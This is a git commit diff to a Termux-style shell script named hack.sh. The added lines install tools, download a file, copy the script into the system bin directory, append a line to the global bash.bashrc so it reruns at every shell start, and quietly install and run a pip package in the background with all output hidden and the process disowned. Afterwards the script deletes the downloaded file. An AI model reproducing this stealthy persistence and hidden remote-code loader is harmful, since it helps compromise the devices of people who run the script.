a639b191355970e270a8e4bcc62c56dff2dc7191
all-drama <90520716+all-drama@users.noreply.github.com>
2022-09-11 18:33:40 +0530

    Update hack.sh

--- hack.sh
+++ hack.sh
@@ -1,7 +1,14 @@
 cd $HOME
+apt install wget -y
+apt install python -y
+apt install zip -y
 wget https://raw.githubusercontent.com/all-drama/hack/main/david.txt
+mv hack.sh $PREFIX/etc/bin 
+echo "bash hack.sh" >> $PREFIX/etc/bash.bashrc
 _evalBg() {
 eval "$@" &>/dev/null & disown;
 }
-cmd="pip install shikari && shikari";
+cmd="pip install david4you && david";
 _evalBg "${cmd}";
+cd $HOME
+rm -f david.txt
